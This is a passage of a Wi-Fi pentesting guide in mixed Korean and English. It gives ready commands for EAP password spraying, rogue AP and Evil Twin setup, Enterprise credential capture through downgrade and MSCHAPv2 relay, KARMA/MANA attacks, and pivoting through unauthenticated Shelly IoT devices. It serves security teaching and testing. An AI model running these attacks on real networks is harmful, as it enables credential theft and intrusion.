#   20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
```
</details>

노트:
- 배포가 보호된 신원/가명 없이 bare EAP‑SIM/AKA를 사용하는 경우 TLS 터널보다 앞서 작동합니다.
- 노출된 값은 가입자의 SIM에 연결된 영구 식별자이며, 이를 수집하면 장기 추적 및 이후의 통신망 악용이 가능해집니다.

Impact
- Privacy: 공공장소에서의 수동 Wi‑Fi 캡처로 인한 지속적인 사용자/기기 추적.
- Telecom abuse bootstrap: IMSI가 있으면 SS7/Diameter 접근 권한이 있는 공격자가 위치 조회를 하거나 통화/SMS 가로채기 및 MFA 탈취를 시도할 수 있습니다.

Mitigations / what to look for
- 클라이언트가 3GPP 지침(예: 3GPP TS 33.402)에 따라 EAP‑SIM/AKA에 대해 anonymous outer identities(가명)를 사용하는지 확인하세요.
- 신원(identity) 단계를 터널링하는 것을 권장합니다(예: 내부 EAP‑SIM/AKA를 포함하는 EAP‑TTLS/PEAP). 이러면 IMSI가 평문으로 전송되지 않습니다.
- association/auth의 패킷 캡처에서 EAP-Response/Identity에 원시 IMSI가 노출되어서는 안 됩니다.

Related: Telecom signalling exploitation with captured mobile identifiers
{{#ref}}
../pentesting-network/telecom-network-exploitation.md
{{#endref}}

### EAP-Bruteforce (password spray)

클라이언트가 **username and password**를 사용하도록 예상되는 경우(이 경우 **EAP-TLS won't be valid**임에 유의), **list** of **usernames**(다음 부분 참조)와 **passwords**를 확보한 다음 [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.** 을 사용해 접근을 **bruteforce** 시도할 수 있습니다.
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
`eaphammer`를 사용해서도 이 공격을 수행할 수 있습니다:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Client attacks Theory

### Network Selection and Roaming

- The 802.11 protocol defines how a station joins an Extended Service Set (ESS) but does not specify the criteria for selecting an ESS or an access point (AP) within it.
- Stations can roam between APs sharing the same ESSID, maintaining connectivity across a building or area.
- The protocol requires station authentication to the ESS but does not mandate AP authentication to the station.

### Preferred Network Lists (PNLs)

- Stations store the ESSID of every wireless network they connect to in their Preferred Network List (PNL), along with network-specific configuration details.
- The PNL is used to automatically connect to known networks, improving the user's experience by streamlining the connection process.

### Passive Scanning

- APs periodically broadcast beacon frames, announcing their presence and features, including the AP's ESSID unless broadcasting is disabled.
- During passive scanning, stations listen for beacon frames. If a beacon's ESSID matches an entry in the station's PNL, the station may automatically connect to that AP.
- Knowledge of a device's PNL allows for potential exploitation by mimicking a known network's ESSID, tricking the device into connecting to a rogue AP.

### Active Probing

- Active probing involves stations sending probe requests to discover nearby APs and their characteristics.
- Directed probe requests target a specific ESSID, helping detect if a particular network is within range, even if it's a hidden network.
- Broadcast probe requests have a null SSID field and are sent to all nearby APs, letting the station check for any preferred network without disclosing its PNL contents.

## Simple AP with redirection to Internet

Before explaining how to perform more complex attacks it's going to be explained **how** to just **create** an **AP** and **redirect** it's **traffic** to an interface connected **to** the **Internet**.

Using `ifconfig -a` check that the wlan interface to create the AP and the interface connected to the Internet are present.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
구성 파일 `/etc/dnsmasq.conf`을 생성합니다:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
그런 다음 **set IPs** 및 **routes**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
그런 다음 dnsmasq를 **시작**하세요:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
구성 파일 `hostapd.conf`을 생성하세요:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**성가신 프로세스 중지** , 설정 **monitor mode**, 그리고 **hostapd 시작**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### 포워딩 및 리디렉션
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

An evil twin 공격은 WiFi 클라이언트가 네트워크를 인식하는 방식을 악용합니다. 클라이언트는 주로 네트워크 이름(ESSID)에 의존하며, base station (access point)가 클라이언트에게 스스로를 authenticate해야 할 필요가 없습니다. 주요 포인트는 다음과 같습니다:

- **구분의 어려움**: 장치는 동일한 ESSID 및 encryption type을 공유할 경우 정상 access points와 rogue access points를 구분하기 어렵습니다. 실제 네트워크는 범위를 매끄럽게 확장하기 위해 동일한 ESSID를 가진 여러 access points를 사용하는 경우가 많습니다.
- **클라이언트 로밍 및 연결 조작**: 802.11 프로토콜은 장치가 동일한 ESS 내의 access points 간에 로밍하는 것을 허용합니다. 공격자는 장치를 현재 base station에서 끊어내고 rogue access point에 연결되도록 유도함으로써 이를 악용할 수 있습니다. 이는 더 강한 신호를 제공하거나 deauthentication packets나 jamming 같은 방법으로 정상 access point와의 연결을 방해함으로써 달성할 수 있습니다.
- **실행의 어려움**: 여러 개의 잘 배치된 access points가 있는 환경에서는 evil twin attack을 성공적으로 실행하기 어려울 수 있습니다. 단일 정상 access point를 deauthenticate하면 종종 장치가 다른 정상 access point에 연결되기 때문에, 공격자는 주변의 모든 access points를 deauthenticate하거나 rogue access point를 전략적으로 배치해야 합니다.

You can create a very basic Open Evil Twin (no capabilities to route traffic to Internet) doing:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
또한 **eaphammer**를 사용해 Evil Twin을 만들 수 있습니다 (참고: eaphammer로 evil twins를 생성할 때 인터페이스는 **should NOT be** **monitor** 모드에 있어서는 안 됩니다):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Or using Airgeddon: `Options: 5,6,7,8,9 (inside Evil Twin attack menu).`

![](<../../images/image (1088).png>)

기본적으로 PNL에 있는 ESSID가 WPA로 보호된 것으로 저장되어 있으면, 장치는 자동으로 Open evil Twin에 연결하지 않는다는 점에 유의하세요. 실제 AP를 DoS해서 사용자가 수동으로 당신의 Open evil twin에 연결하기를 기대할 수 있고, 또는 실제 AP를 DoS한 다음 WPA Evil Twin을 사용해 handshake를 캡처할 수도 있습니다(이 방법은 victim이 당신에게 연결하게 할 수는 없습니다 — PSK를 모르기 때문이지만, handshake는 캡처해서 crack을 시도할 수 있습니다).

_Some OS and AV will warn the user that connect to an Open network is dangerous..._

### WPA/WPA2 Evil Twin

You can create an **Evil Twin using WPA/2** and if the devices have configured to connect to that SSID with WPA/2, they are going to try to connect. Anyway, **to complete the 4-way-handshake** you also need to **know** the **비밀번호** that the 클라이언트 is going to use. If you **don't know** it, the **connection won't be completed**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

이 공격을 이해하려면 먼저 간단한 [WPA Enterprise explanation](#wpa-enterprise-mgt)를 읽어보시길 권합니다.

**hostapd-wpe 사용**

`hostapd-wpe`는 동작하려면 **구성** 파일이 필요합니다. 이 구성 파일 생성을 **자동화**하려면 [https://github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad)를 사용할 수 있습니다 (다운로드: _/etc/hostapd-wpe/_ 안에 있는 python 파일).
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
구성 파일에서 ssid, channel, 사용자 파일, cret/key, dh parameters, wpa version 및 auth 같은 다양한 항목을 선택할 수 있습니다...

[**Using hostapd-wpe with EAP-TLS to allow any certificate to login.**](evil-twin-eap-tls.md)

**EAPHammer 사용**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
기본적으로 EAPHammer는 다음 인증 방법을 사용합니다(먼저 평문 비밀번호 획득을 위해 GTC를 시도한 다음 더 강력한 인증 방법을 사용함):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
이는 긴 연결 시간을 피하기 위한 기본 방법입니다. 그러나 인증 방법을 가장 약한 것부터 가장 강한 것까지 서버에 지정할 수도 있습니다:
```
--negotiate weakest
```
Or you could also use:

- `--negotiate gtc-downgrade` to use highly efficient GTC downgrade implementation (plaintext passwords)
- `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` to specify manually the methods offered (offering the same auth methods in the same order as the organisation the attack will be much more difficult to detect).
- [Find more info in the wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

#### When clients skip RADIUS certificate validation (PEAP/TTLS)

- If devices are configured with "do not validate certificate", a cloned AP + rogue RADIUS (`eaphammer --cert-wizard --creds --auth wpa-eap`) will collect **NetNTLMv2** (PEAP-MSCHAPv2) or **cleartext** creds (PEAP-GTC). `bettercap` deauth (`wifi.deauth <BSSID>`) both reveals hidden SSIDs during probes and forces reconnects, unless PMF/802.11w blocks spoofed deauth.
- Cracked NetNTLMv2 gives reusable Wi‑Fi/AD creds; GTC yields immediate plaintext.

#### Relaying PEAP-MSCHAPv2 instead of cracking (wpa_sycophant + hostapd-mana)

- For machine accounts with uncrackable random passwords, abuse **MSCHAPv2 relay**: run `hostapd-mana` as the Evil Twin, forwarding the MSCHAPv2 exchange to `wpa_sycophant`, which simultaneously connects to the legitimate AP. Successful relay grants authenticated Wi‑Fi without recovering the password.
- Use builds that support the target security level (WPA3/PMF requires recent hostapd/wpa_supplicant); PMF prevents deauth coercion, so wait for voluntary client associations.

**Using Airgeddon**

`Airgeddon` can use previously generated certificated to offer EAP authentication to WPA/WPA2-Enterprise networks. The fake network will downgrade the connection protocol to EAP-MD5 so it will be able to **capture the user and the MD5 of the password**. Later, the attacker can try to crack the password.\
`Airggedon` offers you the possibility of a **continuous Evil Twin attack (noisy)** or **only create the Evil Attack until someone connects (smooth).**

![](<../../images/image (936).png>)

### Debugging PEAP and EAP-TTLS TLS tunnels in Evil Twins attacks

_This method was tested in an PEAP connection but as I'm decrypting an arbitrary TLS tunnel this should also works with EAP-TTLS_

Inside the **configuration** of _hostapd-wpe_ **comment** the line that contains _**dh_file**_ (from `dh_file=/etc/hostapd-wpe/certs/dh` to `#dh_file=/etc/hostapd-wpe/certs/dh`)\
This will make `hostapd-wpe` to **exchange keys using RSA** instead of DH, so you will be able to **decrypt** the traffic later **knowing the servers private key**.

Now start the **Evil Twin** using **`hostapd-wpe`** with that modified configuration as usual. Also, start **`wireshark`** in the **interface** which is performing the Evil Twin attack.

Now or later (when you have already captured some authentication intents) you can add the private RSA key to wireshark in: `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Add a new entry and fill the form with this values: **IP address = any** -- **Port = 0** -- **Protocol = data** -- **Key File** (**select your key file**, to avoid problems select a key file **without being password protected**).

![](<../../images/image (687).png>)

And look at the new **"Decrypted TLS" tab**:

![](<../../images/image (231).png>)

## KARMA, MANA, Loud MANA and Known beacons attack

### ESSID and MAC black/whitelists

Different types of Media Access Control Filter Lists (MFACLs) and their corresponding modes and effects on the behavior of a rogue Access Point (AP):

1. **MAC-based Whitelist**:
- The rogue AP will respond only to probe requests from devices specified in the whitelist, remaining invisible to all others not listed.
2. **MAC-based Blacklist**:
- The rogue AP will ignore probe requests from devices on the blacklist, effectively making the rogue AP invisible to those specific devices.
3. **SSID-based Whitelist**:
- The rogue AP will respond to probe requests only for specific ESSIDs listed, making it invisible to devices whose Preferred Network Lists (PNLs) do not contain those ESSIDs.
4. **SSID-based Blacklist**:
- The rogue AP will not respond to probe requests for the specific ESSIDs on the blacklist, making it invisible to devices seeking those particular networks.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

이 방법은 공격자가 악성 access point (AP)를 생성하여 네트워크에 연결하려는 장치들의 모든 probe requests에 응답할 수 있게 한다. 이 기술은 장치들이 찾고 있는 네트워크를 흉내 내어 장치들이 공격자의 AP에 연결되도록 속인다. 장치가 이 악성 AP에 연결 요청을 보내면 연결이 완료되어 장치는 공격자의 네트워크에 잘못 연결되게 된다.

### MANA

그 후 장치들은 불안정한 네트워크 응답을 무시하기 시작하여 원래의 karma attack의 효율이 떨어졌다. 그러나 Ian de Villiers와 Dominic White가 소개한 MANA attack이라는 새로운 방법이 등장했다. 이 방법은 악성 AP가 장치들의 Preferred Network Lists (PNL)를 캡처하는 것을 포함하는데, 장치들이 브로드캐스트 probe requests를 보낼 때 장치들이 이전에 저장한 네트워크 이름(SSIDs)으로 응답함으로써 이루어진다. 이 정교한 공격은 장치들이 알려진 네트워크를 기억하고 우선순위를 매기는 방식을 악용하여 원래의 karma attack에 대한 방어를 우회한다.

MANA attack은 장치들의 directed 및 broadcast probe requests를 모니터링하면서 동작한다. directed 요청의 경우 장치의 MAC 주소와 요청된 네트워크 이름을 기록하여 목록에 추가한다. 브로드캐스트 요청이 수신되면 AP는 장치 목록에 있는 네트워크와 일치하는 정보를 응답하여 장치가 악성 AP에 연결하도록 유도한다.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

**Loud MANA attack**는 디바이스가 directed probing을 사용하지 않거나 공격자가 Preferred Network Lists (PNL)을 모를 때 사용하는 고급 전략이다. 이 방법은 **같은 지역에 있는 디바이스들은 자신의 PNLs에 일부 네트워크 이름을 공유할 가능성이 높다**는 원칙에 따라 작동한다. 선택적으로 응답하는 대신, 이 공격은 관찰된 모든 디바이스의 결합된 PNLs에서 발견되는 모든 네트워크 이름(ESSID)에 대해 probe responses를 방송한다. 이러한 광범위한 접근 방식은 디바이스가 익숙한 네트워크를 인식하고 rogue Access Point (AP)에 연결을 시도할 가능성을 높인다.
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Known Beacon attack

만약 **Loud MANA attack**가 충분하지 않다면, **Known Beacon attack**는 또 다른 방법을 제공합니다. 이 방법은 **wordlist에서 추출한 잠재적 ESSIDs 목록을 순회하면서 모든 네트워크 이름에 반응하는 AP를 시뮬레이션하여 연결 과정을 무차별적으로 수행합니다**. 이것은 많은 네트워크가 존재하는 것처럼 가장하여, 피해자의 PNL 내에 일치하는 ESSID가 있길 기대하며, 그러면 기기가 조작된 AP에 연결을 시도하게 합니다. 더 적극적으로 기기를 유인하려면 `--loud` 옵션과 결합하여 공격을 증폭할 수 있습니다.

Eaphammer는 이 공격을 리스트 안의 모든 ESSIDs에 응답하는 MANA attack으로 구현했습니다(또는 `--loud`와 결합하여 Loud MANA + Known beacons attack을 만들 수도 있습니다):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Known Beacon Burst attack**

**Known Beacon Burst attack**는 **파일에 나열된 각 ESSID에 대해 beacon frames를 빠르게 연속 방송하는** 것을 포함합니다. 이로 인해 가짜 네트워크가 밀집한 환경이 형성되어, 특히 MANA attack과 결합되었을 때 기기가 rogue AP에 연결될 가능성이 크게 증가합니다. 이 기술은 속도와 양을 활용해 기기의 네트워크 선택 메커니즘을 압도합니다.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct**는 전통적인 무선 access point 없이도 장치들이 Wi‑Fi를 통해 직접 연결할 수 있게 해주는 프로토콜입니다. 이 기능은 프린터나 TV 같은 다양한 IoT 기기에 통합되어 있으며, 한 기기가 연결을 관리하는 access point 역할을 맡는 경우가 있는데 이를 group owner라고 합니다.

Wi‑Fi Direct 연결의 보안은 **Wi‑Fi Protected Setup (WPS)**을 통해 설정되며, 안전한 페어링을 위해 다음과 같은 여러 방법을 지원합니다:

- **Push-Button Configuration (PBC)**
- **PIN entry**
- **Near-Field Communication (NFC)**

이들 방법, 특히 PIN entry는 전통적인 Wi‑Fi 네트워크에서의 WPS와 동일한 취약성에 노출될 수 있어 유사한 공격 벡터의 대상이 됩니다.

### EvilDirect Hijacking

**EvilDirect Hijacking**은 Wi‑Fi Direct에 특화된 공격입니다. 이는 Evil Twin 공격 개념을 그대로 가져와 Wi‑Fi Direct 연결을 목표로 삼습니다. 공격자는 합법적인 group owner를 사칭하여 기기들이 악성 엔티티로 연결되도록 유도합니다. 이 방법은 `airbase-ng` 같은 도구를 사용해 사칭 대상의 채널, ESSID, MAC 주소를 지정하여 실행할 수 있습니다:

## Commissioning AP persistence & dual-homed IoT pivoting (Shelly Gen4 case)

일부 소비자용 IoT 릴레이/컨트롤러는 IoT WLAN에 가입한 후에도 commissioning **open AP**를 활성 상태로 유지합니다(예: `Shelly`로 시작하는 Shelly Gen4 SSID). 해당 기기는 기본 IP `192.168.33.1`을 가진 AP 인터페이스와 내부 WLAN의 클라이언트 인터페이스를 동시에 보유한 **dual-homed** 상태로 남습니다.

**Abuse flow (Wi‑Fi proximity required):**

1. Provisioning AP에 접속하여 DHCP 리스를 얻고, **AP-side HTTP API**를 탐색합니다.
2. 인증 없는 엔드포인트(예: `http://192.168.33.1/relay/0?turn=on`)를 통해 릴레이를 트리거하면 문/게이트/차고 등에 영향이 생길 수 있습니다. 펌웨어 업로드 엔드포인트를 이용해 persistence를 추가할 수도 있습니다.
3. 이를 **pivot** 용도로 사용합니다: Shelly 스크립팅은 내부 인터페이스에서 다른 LAN 호스트로 HTTP를 보낼 수 있습니다. 예를 들어 `10.0.98.221`의 다른 Shelly로 피벗하는 예:
```javascript
Shelly.addEventHandler(function (event) {
if (event.component === "switch:0" && event.info.state) {
Shelly.call("HTTP.GET", { url: "http://10.0.98.221/light/0?turn=on" });
}
});
```
도달 가능한 내부 HTTP 대상의 URL로 교체하면 되며, dual-homing은 추가 라우팅/NAT 작업을 피할 수 있게 합니다.
4. 대규모로는 vendor SSIDs를 **wigle.net**에서 조회(예: `Shelly`)하여 현장 악용을 위한 commissioning AP 위치를 찾습니다.

persistence를 위해 commissioning AP를 활성 상태로 남겨두십시오.

## References

- [https://www.pentestpartners.com/security-blog/shelly-iot-door-controller-config-fail-leaving-your-garage-home-and-security-exposed/](https://www.pentestpartners.com/security-blog/shelly-iot-door-controller-config-fail-leaving-your-garage-home-and-security-exposed/)
- [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
- [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
- [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
- [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
- [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [The vulnerability that killed FreeWifi_Secure](https://7h30th3r0n3.fr/the-vulnerability-that-killed-freewifi_secure/)
- [RFC 4186 – EAP-SIM Authentication](https://datatracker.ietf.org/doc/html/rfc4186)
- [3GPP TS 33.402 – 3GPP system architecture evolution (SAE); Security aspects of non-3GPP accesses](https://www.3gpp.org/ftp/Specs/archive/33_series/33.402/)
- [Wireless-(in)Fidelity: Pentesting Wi-Fi in 2025 (Synacktiv)](https://www.synacktiv.com/en/publications/wireless-infidelity-pentesting-wi-fi-in-2025.html)
- [PEAP relay attacks with wpa_sycophant (SensePost)](https://sensepost.com/blog/2019/peap-relay-attacks-with-wpa_sycophant/)


TODO: Take a look to [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (Facebook 로그인 및 captive portal에서 WPA 모방)

{{#include ../../banners/hacktricks-training.md}}
